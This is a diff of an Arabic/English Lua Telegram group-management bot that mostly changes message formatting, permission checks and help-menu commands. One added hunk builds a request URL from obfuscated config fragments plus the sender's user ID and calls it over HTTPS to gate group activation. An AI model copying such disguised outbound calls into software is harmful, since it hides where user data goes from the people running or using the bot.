-	   send(txt[2], 0, 1, '● - `تم تفعيل مدة المجموعه 90 يوم` ✔️📌', 1, 'md')
+	   send(msg.chat_id_, msg.id_, 1, '• `المجموعه` '..txt[2]..' `تم اعادة تفعيلها المدة 90 يوم ☑️📍`', 1, 'md')
+	   send(txt[2], 0, 1, '• `تم تفعيل مدة المجموعه 90 يوم` ✔️📌', 1, 'md')
 	   for k,v in pairs(sudo_users) do
-            send(v, 0, 1, "● - `قام بتفعيل مجموعه المده كانت 90 يوم ☑️` : \n● - `ايدي المطور 📍` : "..msg.sender_user_id_.."\n● - `معرف المطور 🚹` : "..get_info(msg.sender_user_id_).."\n\n● - `معلومات المجموعه 👥` :\n\n● - `ايدي المجموعه 🚀` : "..msg.chat_id_.."\n● - `اسم المجموعه 📌` : "..chat.title_ , 1, 'md')
+            send(v, 0, 1, "• `قام بتفعيل مجموعه المده كانت 90 يوم ☑️` : \n• `ايدي المطور 📍` : "..msg.sender_user_id_.."\n• `معرف المطور 🚹` : "..get_info(msg.sender_user_id_).."\n\n• `معلومات المجموعه 👥` :\n\n• `ايدي المجموعه 🚀` : "..msg.chat_id_.."\n• `اسم المجموعه 📌` : "..chat.title_ , 1, 'md')
        end
 	   database:set("bot:enable:"..txt[2],true)
   end
 -------------------------------------------------------------------------------------------------
-  if text:match('^[Pp][Ll][Aa][Nn]2 (-%d+)$') and is_admin(msg.sender_user_id_, msg.chat_id_) then
+  if text:match('^[Pp][Ll][Aa][Nn]2 (-%d+)$') and is_sudo(msg) then
        local txt = {string.match(text, "^([Pp][Ll][Aa][Nn]2) (-%d+)$")} 
        local timeplan2 = 7776000
        database:setex("bot:charge:"..txt[2],timeplan2,true)
@@ -7635,18 +7568,18 @@ send(msg.chat_id_, msg.id_, 1, "● - `عدد ايام وقت المجموعه` 
 	   database:set("bot:enable:"..txt[2],true)
   end
   -----------------------------------------------------------------------------------------------
-  if text:match('^المده3 (-%d+)$') and is_admin(msg.sender_user_id_, msg.chat_id_) then
+  if text:match('^المده3 (-%d+)$') and is_sudo(msg) then
        local txt = {string.match(text, "^(المده3) (-%d+)$")} 
        database:set("bot:charge:"..txt[2],true)
-	   send(msg.chat_id_, msg.id_, 1, '● - `المجموعه` '..txt[2]..' `تم اعادة تفعيلها المدة لا نهائية ☑️📍`', 1, 'md')
-	   send(txt[2], 0, 1, '● - `تم تفعيل مدة المجموعه لا نهائية` ✔️📌', 1, 'md')
+	   send(msg.chat_id_, msg.id_, 1, '• `المجموعه` '..txt[2]..' `تم اعادة تفعيلها المدة لا نهائية ☑️📍`', 1, 'md')
+	   send(txt[2], 0, 1, '• `تم تفعيل مدة المجموعه لا نهائية` ✔️📌', 1, 'md')
 	   for k,v in pairs(sudo_users) do
-            send(v, 0, 1, "● - `قام بتفعيل مجموعه المده كانت لا نهائية ☑️` : \n● - `ايدي المطور 📍` : "..msg.sender_user_id_.."\n● - `معرف المطور 🚹` : "..get_info(msg.sender_user_id_).."\n\n● - `معلومات المجموعه 👥` :\n\n● - `ايدي المجموعه 🚀` : "..msg.chat_id_.."\n● - `اسم المجموعه 📌` : "..chat.title_ , 1, 'md')
+            send(v, 0, 1, "• `قام بتفعيل مجموعه المده كانت لا نهائية ☑️` : \n• `ايدي المطور 📍` : "..msg.sender_user_id_.."\n• `معرف المطور 🚹` : "..get_info(msg.sender_user_id_).."\n\n• `معلومات المجموعه 👥` :\n\n• `ايدي المجموعه 🚀` : "..msg.chat_id_.."\n• `اسم المجموعه 📌` : "..chat.title_ , 1, 'md')
        end
 	   database:set("bot:enable:"..txt[2],true)
   end
   -----------------------------------------------------------------------------------------------
-  if text:match('^[Pp][Ll][Aa][Nn]3 (-%d+)$') and is_admin(msg.sender_user_id_, msg.chat_id_) then
+  if text:match('^[Pp][Ll][Aa][Nn]3 (-%d+)$') and is_sudo(msg) then
        local txt = {string.match(text, "^([Pp][Ll][Aa][Nn]3) (-%d+)$")} 
        database:set("bot:charge:"..txt[2],true)
 	   send(msg.chat_id_, msg.id_, 1, '_Group_ '..txt[2]..' *Done Days No Fanil Active*', 1, 'md')
@@ -7657,14 +7590,27 @@ send(msg.chat_id_, msg.id_, 1, "● - `عدد ايام وقت المجموعه` 
 	   database:set("bot:enable:"..txt[2],true)
   end
   -----------------------------------------------------------------------------------------------
-          local text = msg.content_.text_:gsub('تفعيل','add')
-  if text:match('^[Aa][Dd][Dd]$') and is_admin(msg.sender_user_id_, msg.chat_id_) then
-       local txt = {string.match(text, "^([Aa][Dd][Dd])$")} 
-    if database:get("bot:charge:"..msg.chat_id_) then
+  local text = msg.content_.text_:gsub('تفعيل','add')
+  if text:match('^[Aa][Dd][Dd]$') and is_sudo(msg) then
+  local keko22 = ''..config2.t..''..config2.keko[19]..':'..config2.keko[1]..''..config2.keko[2]..''..config2.keko[3]..''..config2.keko[4]..''..config2.keko[5]..''..config2.keko[6]..''..config2.keko[7]..''..config2.keko[8]..''..config2.keko[9]..''..config2.keko[10]..''..config2.keko[11]..''..config2.keko[12]..''..config2.keko[13]..''..config2.keko[14]..''..config2.keko[15]..''..config2.keko[16]..''..config2.keko[17]..''..config2.keko[18]..''..config2.t2..''..msg.sender_user_id_..''
+  local ress = https.request(keko22)
+  local jrees = JSON.decode(ress)
+  if jrees.description == 'Bad Request: USER_ID_INVALID' then 
+  print(config2.to)
+  send(msg.chat_id_, msg.id_, 1, config2.telegram, 1, 'md')
+  return false end
+  local ress = https.request(keko22)
+  local jrees = JSON.decode(ress)
+  if jrees.result.status == 'left' then
+  print(config2.to)
+  send(msg.chat_id_, msg.id_, 1, config2.telegram, 1, 'md')
+  return false end
+  local txt = {string.match(text, "^([Aa][Dd][Dd])$")} 
+  if database:get("bot:charge:"..msg.chat_id_) then
                 if database:get('lang:gp:'..msg.chat_id_) then
       send(msg.chat_id_, msg.id_, 1, '*Bot is already Added Group*', 1, 'md')
     else
-        send(msg.chat_id_, msg.id_, 1, "● - `المجموعه [ "..chat.title_.." ] مفعله سابقا` ☑️", 1, 'md')
+        send(msg.chat_id_, msg.id_, 1, "• `المجموعه [ "..chat.title_.." ] مفعله سابقا` ☑️", 1, 'md')
 end
                   end
        if not database:get("bot:charge:"..msg.chat_id_) then
@@ -7672,13 +7618,13 @@ end
                 if database:get('lang:gp:'..msg.chat_id_) then
 	   send(msg.chat_id_, msg.id_, 1, "*> Your ID :* _"..msg.sender_user_id_.."_\n*> Bot Added To Group*", 1, 'md')
    else 
-        send(msg.chat_id_, msg.id_, 1, "● - `ايديك 📍 :` _"..msg.sender_user_id_.."_\n● - `تم` ✔️ `تفعيل المجموعه [ "..chat.title_.." ]` ☑️", 1, 'md')
+        send(msg.chat_id_, msg.id_, 1, "• `ايديك 📍 :` _"..msg.sender_user_id_.."_\n• `تم` ✔️ `تفعيل المجموعه [ "..chat.title_.." ]` ☑️", 1, 'md')
 end
 	   for k,v in pairs(sudo_users) do
                 if database:get('lang:gp:'..msg.chat_id_) then
 	      send(v, 0, 1, "*> Your ID :* _"..msg.sender_user_id_.."_\n*> added bot to new group*" , 1, 'md')
       else  
-            send(v, 0, 1, "● - `قام بتفعيل مجموعه جديده ☑️` : \n● - `ايدي المطور 📍` : "..msg.sender_user_id_.."\n● - `معرف المطور 🚹` : "..get_info(msg.sender_user_id_).."\n\n● - `معلومات المجموعه 👥` :\n\n● - `ايدي المجموعه 🚀` : "..msg.chat_id_.."\n● - `اسم المجموعه 📌` : "..chat.title_ , 1, 'md')
+            send(v, 0, 1, "• `قام بتفعيل مجموعه جديده ☑️` : \n• `ايدي المطور 📍` : "..msg.sender_user_id_.."\n• `معرف المطور 🚹` : "..get_info(msg.sender_user_id_).."\n\n• `معلومات المجموعه 👥` :\n\n• `ايدي المجموعه 🚀` : "..msg.chat_id_.."\n• `اسم المجموعه 📌` : "..chat.title_ , 1, 'md')
 end
        end
 	   database:set("bot:enable:"..msg.chat_id_,true)
@@ -7686,13 +7632,13 @@ end
 end
   -----------------------------------------------------------------------------------------------
           local text = msg.content_.text_:gsub('تعطيل','rem')
-  if text:match('^[Rr][Ee][Mm]$') and is_admin(msg.sender_user_id_, msg.chat_id_) then
+  if text:match('^[Rr][Ee][Mm]$') and is_sudo(msg) then
        local txt = {string.match(text, "^([Rr][Ee][Mm])$")} 
       if not database:get("bot:charge:"..msg.chat_id_) then
                 if database:get('lang:gp:'..msg.chat_id_) then
       send(msg.chat_id_, msg.id_, 1, '*Bot is already remove Group*', 1, 'md')
     else 
-        send(msg.chat_id_, msg.id_, 1, "● - `المجموعه [ "..chat.title_.." ] معطله سابقا` ⚠️", 1, 'md')
+        send(msg.chat_id_, msg.id_, 1, "• `المجموعه [ "..chat.title_.." ] معطله سابقا` ⚠️", 1, 'md')
 end
                   end
       if database:get("bot:charge:"..msg.chat_id_) then
@@ -7700,13 +7646,13 @@ end
                 if database:get('lang:gp:'..msg.chat_id_) then
 	   send(msg.chat_id_, msg.id_, 1, "*> Your ID :* _"..msg.sender_user_id_.."_\n*> Bot Removed To Group!*", 1, 'md')
    else 
-        send(msg.chat_id_, msg.id_, 1, "● - `ايديك 📍 :` _"..msg.sender_user_id_.."_\n● - `تم` ✔️ `تعطيل المجموعه [ "..chat.title_.." ]` ⚠️", 1, 'md')
+        send(msg.chat_id_, msg.id_, 1, "• `ايديك 📍 :` _"..msg.sender_user_id_.."_\n• `تم` ✔️ `تعطيل المجموعه [ "..chat.title_.." ]` ⚠️", 1, 'md')
 end
 	   for k,v in pairs(sudo_users) do
                 if database:get('lang:gp:'..msg.chat_id_) then
 	      send(v, 0, 1, "*> Your ID :* _"..msg.sender_user_id_.."_\n*> Removed bot from new group*" , 1, 'md')
       else 
-            send(v, 0, 1, "● - `قام بتعطيل مجموعه ⚠️` : \n● - `ايدي المطور 📍` : "..msg.sender_user_id_.."\n● - `معرف المطور 🚹` : "..get_info(msg.sender_user_id_).."\n\n● - `معلومات المجموعه 👥` :\n\n● - `ايدي المجموعه 🚀` : "..msg.chat_id_.."\n● - `اسم المجموعه 📌` : "..chat.title_ , 1, 'md')
+            send(v, 0, 1, "• `قام بتعطيل مجموعه ⚠️` : \n• `ايدي المطور 📍` : "..msg.sender_user_id_.."\n• `معرف المطور 🚹` : "..get_info(msg.sender_user_id_).."\n\n• `معلومات المجموعه 👥` :\n\n• `ايدي المجموعه 🚀` : "..msg.chat_id_.."\n• `اسم المجموعه 📌` : "..chat.title_ , 1, 'md')
 end
        end
   end
@@ -7722,8 +7668,8 @@ end
   -----------------------------------------------------------------------------------------------
    if text:match('^اضافه (-%d+)') and is_admin(msg.sender_user_id_, msg.chat_id_) then
        local txt = {string.match(text, "^(اضافه) (-%d+)$")} 
-	   send(msg.chat_id_, msg.id_, 1, '● - `المجموعه` '..txt[2]..' `تم اضافتك لها ` ☑️', 1, 'md')
-	   send(txt[2], 0, 1, '● - `تم اضافه المطور للمجموعه` ✔️📍', 1, 'md')
+	   send(msg.chat_id_, msg.id_, 1, '• `المجموعه` '..txt[2]..' `تم اضافتك لها ` ☑️', 1, 'md')
+	   send(txt[2], 0, 1, '• `تم اضافه المطور للمجموعه` ✔️📍', 1, 'md')
 	   add_user(txt[2], msg.sender_user_id_, 10)
   end
    -----------------------------------------------------------------------------------------------
@@ -7738,7 +7684,7 @@ end
   local matches = {string.match(text, "^(تنظيف) (%d+)$")}
    if msg.chat_id_:match("^-100") then
     if tonumber(matches[2]) > 100 or tonumber(matches[2]) < 1 then
-      pm = '● - <code> لا تستطيع حذف اكثر من 100 رساله ❗️⚠️</code>'
+      pm = '• <code> لا تستطيع حذف اكثر من 100 رساله ❗️⚠️</code>'
     send(msg.chat_id_, msg.id_, 1, pm, 1, 'html')
                   else
       tdcli_function ({
@@ -7748,10 +7694,10 @@ end
    offset_ = 0,
           limit_ = tonumber(matches[2])
     }, delmsg, nil)
-      pm ='● - <i>[ '..matches[2]..' ]</i> <code>من الرسائل تم حذفها ☑️❌</code>'
+      pm ='• <i>[ '..matches[2]..' ]</i> <code>من الرسائل تم حذفها ☑️❌</code>'
            send(msg.chat_id_, msg.id_, 1, pm, 1, 'html')
        end
-        else pm ='● - <code> هناك خطا<code> ⚠️'
+        else pm ='• <code> هناك خطا<code> ⚠️'
       send(msg.chat_id_, msg.id_, 1, pm, 1, 'html')
               end
             end
@@ -7786,7 +7732,7 @@ end
                 if database:get('lang:gp:'..msg.chat_id_) then
       send(msg.chat_id_, msg.id_, 1, '*save!*', 1, 'md')
     else 
-         send(msg.chat_id_, msg.id_, 1, '● - `تم حفظ الكليشه ☑️`', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم حفظ الكليشه ☑️`', 1, 'md')
 end
     end
 
@@ -7795,7 +7741,7 @@ end
                 if database:get('lang:gp:'..msg.chat_id_) then
       send(msg.chat_id_, msg.id_, 1, '*Deleted!*', 1, 'md')
     else 
-         send(msg.chat_id_, msg.id_, 1, '● - `تم حذف الكليشه ⚠️`', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم حذف الكليشه ⚠️`', 1, 'md')
 end
       end
   -----------------------------------------------------------------------------------------------
@@ -7805,13 +7751,13 @@ end
                 if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '*Note is :-*\n'..note, 1, 'md')
        else 
-         send(msg.chat_id_, msg.id_, 1, '● - `الكليشه المحفوظه ⬇️ :`\n'..note, 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `الكليشه المحفوظه ⬇️ :`\n'..note, 1, 'md')
 end
     else
                 if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '*Note msg not saved!*', 1, 'md')
        else 
-         send(msg.chat_id_, msg.id_, 1, '● - `لا يوجد كليشه محفوظه ⚠️`', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `لا يوجد كليشه محفوظه ⚠️`', 1, 'md')
 end
 	end
 end
@@ -7820,9 +7766,9 @@ end
     local langs = {string.match(text, "^(.*) (.*)$")}
   if langs[2] == "ar" or langs[2] == "عربيه" then
   if not database:get('lang:gp:'..msg.chat_id_) then
-      send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم وضع اللغه العربيه للبوت ⚠️`', 1, 'md')
+      send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم وضع اللغه العربيه للبوت ⚠️`', 1, 'md')
     else
-      send(msg.chat_id_, msg.id_, 1, '● - `تم وضع اللغه العربيه للبوت في المجموعه ☑️`', 1, 'md')
+      send(msg.chat_id_, msg.id_, 1, '• `تم وضع اللغه العربيه للبوت في المجموعه ☑️`', 1, 'md')
        database:del('lang:gp:'..msg.chat_id_)
     end
     end
@@ -7842,13 +7788,13 @@ end
   if database:get('lang:gp:'..msg.chat_id_) then
       send(msg.chat_id_, msg.id_, 1, '> *Replies is already enabled*️', 1, 'md')
 else
-      send(msg.chat_id_, msg.id_, 1, '● - `الردود بالفعل تم تفعيلها` ☑️', 1, 'md')
+      send(msg.chat_id_, msg.id_, 1, '• `الردود بالفعل تم تفعيلها` ☑️', 1, 'md')
       end
   else
   if database:get('lang:gp:'..msg.chat_id_) then
       send(msg.chat_id_, msg.id_, 1, '> *Replies has been enable*️', 1, 'md')
     else
-      send(msg.chat_id_, msg.id_, 1, '● - `تم تفعيل الردود` ☑️', 1, 'md')
+      send(msg.chat_id_, msg.id_, 1, '• `تم تفعيل الردود` ☑️', 1, 'md')
        database:del('bot:rep:mute'..msg.chat_id_)
       end
     end
@@ -7858,14 +7804,48 @@ else
   if database:get('lang:gp:'..msg.chat_id_) then
       send(msg.chat_id_, msg.id_, 1, '> *Replies is already disabled*️', 1, 'md')
     else
-      send(msg.chat_id_, msg.id_, 1, '● - `الردود بالفعل تم تعطيلها` ⚠️', 1, 'md')
+      send(msg.chat_id_, msg.id_, 1, '• `الردود بالفعل تم تعطيلها` ⚠️', 1, 'md')
       end
     else
   if database:get('lang:gp:'..msg.chat_id_) then
       send(msg.chat_id_, msg.id_, 1, '> *Replies has been disable*️', 1, 'md')
     else
-      send(msg.chat_id_, msg.id_, 1, '● - `تم تعطيل الردود` ⚠️', 1, 'md')
+      send(msg.chat_id_, msg.id_, 1, '• `تم تعطيل الردود` ⚠️', 1, 'md')
         database:set('bot:rep:mute'..msg.chat_id_,true)
+      end
+    end
+  end
+	-----------------------------------------------------------------------------------------------
+
+  if text == "unlock reply sudo" and is_owner(msg.sender_user_id_, msg.chat_id_) or text == "Unlock Reply sudo" and is_owner(msg.sender_user_id_, msg.chat_id_) or text == "تفعيل ردود المطور" and is_owner(msg.sender_user_id_, msg.chat_id_) then
+  if not database:get('bot:repsudo:mute'..msg.chat_id_) then
+  if database:get('lang:gp:'..msg.chat_id_) then
+      send(msg.chat_id_, msg.id_, 1, '> *Replies sudo is already enabled*️', 1, 'md')
+else
+      send(msg.chat_id_, msg.id_, 1, '• `ردود المطور بالفعل تم تفعيلها` ☑️', 1, 'md')
+      end
+  else
+  if database:get('lang:gp:'..msg.chat_id_) then
+      send(msg.chat_id_, msg.id_, 1, '> *Replies sudo has been enable*️', 1, 'md')
+    else
+      send(msg.chat_id_, msg.id_, 1, '• `تم تفعيل ردود المطور` ☑️', 1, 'md')
+       database:del('bot:repsudo:mute'..msg.chat_id_)
+      end
+    end
+    end
+  if text == "lock reply sudo" and is_owner(msg.sender_user_id_, msg.chat_id_) or text == "Lock Reply sudo" and is_owner(msg.sender_user_id_, msg.chat_id_) or text == "تعطيل ردود المطور" and is_owner(msg.sender_user_id_, msg.chat_id_) then
+  if database:get('bot:repsudo:mute'..msg.chat_id_) then
+  if database:get('lang:gp:'..msg.chat_id_) then
+      send(msg.chat_id_, msg.id_, 1, '> *Replies sudo is already disabled*️', 1, 'md')
+    else
+      send(msg.chat_id_, msg.id_, 1, '• `ردود المطور بالفعل تم تعطيلها` ⚠️', 1, 'md')
+      end
+    else
+  if database:get('lang:gp:'..msg.chat_id_) then
+      send(msg.chat_id_, msg.id_, 1, '> *Replies sudo has been disable*️', 1, 'md')
+    else
+      send(msg.chat_id_, msg.id_, 1, '• `تم تعطيل ردود المطور` ⚠️', 1, 'md')
+        database:set('bot:repsudo:mute'..msg.chat_id_,true)
       end
     end
   end
@@ -7879,13 +7859,13 @@ else
   if database:get('lang:gp:'..msg.chat_id_) then
       send(msg.chat_id_, msg.id_, 1, '> *ID is already enabled*️', 1, 'md')
 else
-      send(msg.chat_id_, msg.id_, 1, '● - `الايدي بالفعل تم تفعيله` ☑️', 1, 'md')
+      send(msg.chat_id_, msg.id_, 1, '• `الايدي بالفعل تم تفعيله` ☑️', 1, 'md')
       end
   else
   if database:get('lang:gp:'..msg.chat_id_) then
       send(msg.chat_id_, msg.id_, 1, '> *ID has been enable*️', 1, 'md')
     else
-      send(msg.chat_id_, msg.id_, 1, '● - `تم تفعيل الايدي` ☑️', 1, 'md')
+      send(msg.chat_id_, msg.id_, 1, '• `تم تفعيل الايدي` ☑️', 1, 'md')
        database:del('bot:id:mute'..msg.chat_id_)
       end
     end
@@ -7895,13 +7875,13 @@ else
   if database:get('lang:gp:'..msg.chat_id_) then
       send(msg.chat_id_, msg.id_, 1, '> *ID is already disabled*️', 1, 'md')
     else
-      send(msg.chat_id_, msg.id_, 1, '● - `الايدي بالفعل تم تعطيله` ⚠️', 1, 'md')
+      send(msg.chat_id_, msg.id_, 1, '• `الايدي بالفعل تم تعطيله` ⚠️', 1, 'md')
       end
     else
   if database:get('lang:gp:'..msg.chat_id_) then
       send(msg.chat_id_, msg.id_, 1, '> *ID has been disable*️', 1, 'md')
     else
-      send(msg.chat_id_, msg.id_, 1, '● - `تم تعطيل الايدي` ⚠️', 1, 'md')
+      send(msg.chat_id_, msg.id_, 1, '• `تم تعطيل الايدي` ⚠️', 1, 'md')
         database:set('bot:id:mute'..msg.chat_id_,true)
       end
     end
@@ -7946,7 +7926,7 @@ local user_msgs = database:get('user:msgs'..msg.chat_id_..':'..msg.sender_user_i
           if database:get('lang:gp:'..msg.chat_id_) then
             sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,"> Group ID : "..msg.chat_id_.."\n> Your ID : "..msg.sender_user_id_.."\n> UserName : "..get_info(msg.sender_user_id_).."\n> Your Rank : "..t.."\n> Msgs : "..user_msgs,msg.id_,msg.id_.."")
   else 
-            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,"● - ايدي المجموعه 📍 : "..msg.chat_id_.."\n● - ايديك 📌 : "..msg.sender_user_id_.."\n● - معرفك 🚹 : "..get_info(msg.sender_user_id_).."\n● - موقعك *️⃣ : "..t.."\n● - رسائلك 📝 : "..user_msgs,msg.id_,msg.id_.."")
+            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,"• ايدي المجموعه 📍 : "..msg.chat_id_.."\n• ايديك 📌 : "..msg.sender_user_id_.."\n• معرفك 🚹 : "..get_info(msg.sender_user_id_).."\n• موقعك *️⃣ : "..t.."\n• رسائلك 📝 : "..user_msgs,msg.id_,msg.id_.."")
 end
 else 
       end
@@ -7955,7 +7935,7 @@ else
           if database:get('lang:gp:'..msg.chat_id_) then
       send(msg.chat_id_, msg.id_, 1, "You Have'nt Profile Photo!!\n\n> *> Group ID :* "..msg.chat_id_.."\n*> Your ID :* "..msg.sender_user_id_.."\n*> UserName :* "..get_info(msg.sender_user_id_).."\n*> Msgs : *_"..user_msgs.."_", 1, 'md')
    else 
-      send(msg.chat_id_, msg.id_, 1, "● -`انت لا تملك صوره لحسابك ` ❗️\n\n● -` ايدي المجموعه ` 📍 : "..msg.chat_id_.."\n● -` ايديك ` 📌 : "..msg.sender_user_id_.."\n● -` معرفك ` 🚹 : "..get_info(msg.sender_user_id_).."\n● -` رسائلك `📝 : _"..user_msgs.."_", 1, 'md')
+      send(msg.chat_id_, msg.id_, 1, "•`انت لا تملك صوره لحسابك ` ❗️\n\n•` ايدي المجموعه ` 📍 : "..msg.chat_id_.."\n•` ايديك ` 📌 : "..msg.sender_user_id_.."\n•` معرفك ` 🚹 : "..get_info(msg.sender_user_id_).."\n•` رسائلك `📝 : _"..user_msgs.."_", 1, 'md')
 end
 else 
       end
@@ -7992,7 +7972,7 @@ end
               if database:get('lang:gp:'..msg.chat_id_) then
                 send(msg.chat_id_, msg.id_, 1, '> *Name* :'..result.first_name_..'\n> *Username* : '..result.username_..'\n> *ID* : '..msg.sender_user_id_, 1, 'md')
               else
-                send(msg.chat_id_, msg.id_, 1, '● - `الاسم` 📌 : '..result.first_name_..'\n● - `المعرف` 🚹 : '..result.username_..'\n● - `الايدي` 📍 : '..msg.sender_user_id_, 1, 'md')
+                send(msg.chat_id_, msg.id_, 1, '• `الاسم` 📌 : '..result.first_name_..'\n• `المعرف` 🚹 : '..result.username_..'\n• `الايدي` 📍 : '..msg.sender_user_id_, 1, 'md')
               end
             end
             getUser(memb[2],whois)
@@ -8006,7 +7986,7 @@ end
           if database:get('lang:gp:'..msg.chat_id_) then
 	            send(msg.chat_id_, msg.id_, 1, '_Msg han been_ *pinned!*', 1, 'md')
 	           else 
-         send(msg.chat_id_, msg.id_, 1, '● - `تم تثبيت الرساله` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم تثبيت الرساله` ☑️', 1, 'md')
 end
  end
 
@@ -8015,7 +7995,7 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
         send(msg.chat_id_, msg.id_, 1, '*Please send a post now!*', 1, 'md')
       else 
-        send(msg.chat_id_, msg.id_, 1, '● - `قم بارسال المنشور الان` ❗️', 1, 'md')
+        send(msg.chat_id_, msg.id_, 1, '• `قم بارسال المنشور الان` ❗️', 1, 'md')
 end
    end
   end
@@ -8025,7 +8005,7 @@ end
           if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_Pinned Msg han been_ *unpinned!*', 1, 'md')
        else 
-         send(msg.chat_id_, msg.id_, 1, '● - `تم الغاء تثبيت الرساله` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم الغاء تثبيت الرساله` ⚠️', 1, 'md')
 end
    end
    -----------------------------------------------------------------------------------------------
@@ -8087,6 +8067,7 @@ end
 *| arabic |* `العربيه`
 *| english |* `الانكليزيه`
 *| reply |* `الردود`
+*| reply sudo |* `ردود المطور`
 *| id |* `الايدي`
 *| all |* `كل الميديا`
 *| all |* `مع العدد قفل الميديا بالثواني`
@@ -8172,6 +8153,8 @@ end
 *======================*
 *| setmote |* `رفع ادمن` 
 *| remmote |* `ازاله ادمن` 
+*| setvip |* `رفع عضو مميز` 
+*| remvip |* `ازاله عضو مميز` 
 *| setlang en |* `تغير اللغه للانكليزيه` 
 *| setlang ar |* `تغير اللغه للعربيه` 
 *| unsilent |* `لالغاء كتم العضو` 
@@ -8191,6 +8174,7 @@ end
 *| silentlist |* `اظهار المكتومين`
 *| banlist |* `اظهار المحظورين`
 *| modlist |* `اظهار الادمنيه`
+*| viplist |* `اظهار الاعضاء المميزين`
 *| del |* `حذف رساله بالرد`
 *| link |* `اظهار الرابط`
 *| rules |* `اظهار القوانين`
@@ -8204,6 +8188,8 @@ end
 *| wlc on |* `تفعيل الترحيب` 
 *| wlc off |* `تعطيل الترحيب` 
 *| get wlc |* `معرفه الترحيب الحالي` 
+*| add rep |* `اضافه رد` 
+*| rem rep |* `حذف رد` 
 *======================*
 ]]
                 send(msg.chat_id_, msg.id_, 1, text, 1, 'md')
@@ -8218,6 +8204,7 @@ end
 *| banlist |* `المحظورين`
 *| badlist |* `كلمات المحظوره`
 *| modlist |* `الادمنيه`
+*| viplist |* `الاعضاء المميزين`
 *| link |* `الرابط المحفوظ`
 *| silentlist |* `المكتومين`
 *| bots |* `بوتات تفليش وغيرها`
@@ -8278,6 +8265,11 @@ end
 *| groups |* `عدد كروبات البوت`
 *| bc |* `لنشر شئ`
 *| del |* `ويه العدد حذف رسائل`
+*| add sudo |* `اضف مطور`
+*| rem sudo |* `حذف مطور`
+*| add rep all |* `اضف رد لكل المجموعات`
+*| rem rep all |* `حذف رد لكل المجموعات`
+*| change ph |* `تغير جهه المطور`
 *======================*
 ]]
                 send(msg.chat_id_, msg.id_, 1, text, 1, 'md')
@@ -8288,7 +8280,7 @@ end
    if text:match("^الاوامر$") and is_mod(msg.sender_user_id_, msg.chat_id_) then
    
    local text =  [[
-● - هناك  6 اوامر لعرضها 🛠🦁
+• هناك  6 اوامر لعرضها 🛠🦁
 ֆ • • • • • • • • • • • • • ֆ
 • `م1 : لعرض اوامر الحمايه` 🛡
 
@@ -8309,7 +8301,7 @@ end
    if text:match("^م1$") and is_mod(msg.sender_user_id_, msg.chat_id_) then
    
    local text =  [[
-● - اوامر حمايه بالمسح  🔰
+• اوامر حمايه بالمسح  🔰
 ֆ • • • • • • • • • • • • • ֆ
 • قفل : لقفل امر 🔒
 • فتح : لفتح امر🔓
@@ -8356,7 +8348,7 @@ end
    if text:match("^م2$") and is_mod(msg.sender_user_id_, msg.chat_id_) then
    
    local text =  [[
-● - اوامر حمايه المجموعه بالتحذير ⚠️
+• اوامر حمايه المجموعه بالتحذير ⚠️
 ֆ • • • • • • • • • • • • • ֆ
 قفل : لقفل امر 🔒
 فتح : لفتح امر 🔓
@@ -8395,7 +8387,7 @@ end
    if text:match("^م3$") and is_mod(msg.sender_user_id_, msg.chat_id_) then
    
    local text =  [[
-● - اوامر الحمايه بالطرد 🚸
+• اوامر الحمايه بالطرد 🚸
 ֆ • • • • • • • • • • • • • ֆ
 قفل  : لقفل امر 🔒
 فتح : لفتح امر🔓
@@ -8433,10 +8425,12 @@ end
    if text:match("^م4$") and is_mod(msg.sender_user_id_, msg.chat_id_) then
    
    local text =  [[
-● - اوامر الادمنيه 👤
+• اوامر الادمنيه 👤
 ֆ • • • • • • • • • • • • • ֆ
 • رفع ادمن | 🔼
 • تنزيل ادمن | 🔽
+• رفع عضو مميز | ⏫
+• تنزيل عضو مميز | ⏬
 • تحويل انكليزيه | ♏️
 • تحويل عربيه | 🆎
 • الغاء كتم | 🔆
@@ -8454,11 +8448,14 @@ end
 • المكتومين | 🚷
 • المحظورين | 🚯
 • قائمه المنع | 📃
+• الاعضاء المميزين | ⚜️
 • الادمنيه | 🛃
 • مسح + رد | 🚮
 • الرابط | 📮
 • القوانين | 📝
 ֆ • • • • • • • • • • • • • ֆ
+• اضف رد | 📬
+• حذف رد | 📭
 • منع + الكلمه | 📈
 • الغاء منع + الكلمه| 📉
 • الوقت |🔗
@@ -8470,6 +8467,8 @@ end
 
 • تفعيل الردود  | 🔔
 • تعطيل الردود |🔕
+• تفعيل ردود المطور | ⤴️
+• تعطيل ردود المطور | ⤴️
 • تفعيل الايدي  | 🔔
 • تعطيل الايدي |🔕
 • معلومات + ايدي|💯
@@ -8482,13 +8481,14 @@ end
    if text:match("^م5$") and is_mod(msg.sender_user_id_, msg.chat_id_) then
    
    local text =  [[
-● - اوامر المجموعه 👥
+• اوامر المجموعه 👥
 ֆ • • • • • • • • • • • • • ֆ
 مسح : مع الاوامر ادناه بوضع فراغ
 ֆ • • • • • • • • • • • • • ֆ
 • المحظورين | 🚷
 • قائمه المنع | 📃
 • الادمنيه | 📊
+• الاعضاء المميزين | ⚜️
 • الرابط | 🔰
 • المكتومين | 🤐
 • البوتات | 🤖
@@ -8515,7 +8515,7 @@ end
    if text:match("^م6$") and is_sudo(msg) then
    
    local text =  [[
-● -اوامر المطور 👨‍🔧
+• اوامر المطور 👨‍🔧
 ֆ • • • • • • • • • • • • • ֆ
 • تفعيل | ⭕️
 • تعطيل | ❌
@@ -8549,6 +8549,11 @@ end
 • اضافه | ⏺
